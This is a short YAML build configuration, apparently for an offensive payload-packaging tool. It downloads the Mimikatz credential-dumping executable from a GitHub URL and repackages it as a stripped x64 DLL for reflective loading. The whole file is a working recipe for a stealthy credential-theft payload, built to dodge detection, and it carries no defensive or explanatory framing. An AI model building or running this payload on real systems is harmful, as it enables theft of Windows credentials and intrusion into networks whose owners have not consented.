schema: 6
name: mimi-dll
build:
  payloads:
    mimikatz:
      source: "https://github.com/ParrotSec/mimikatz/raw/refs/heads/master/x64/mimikatz.exe"
  output:
    path: ./dist/mimi-dll.dll
    kind: dll
    entry: auto
    arch: x64
    strip: true
    trim_paths: all
runtime:
  - technique: reflective_loading
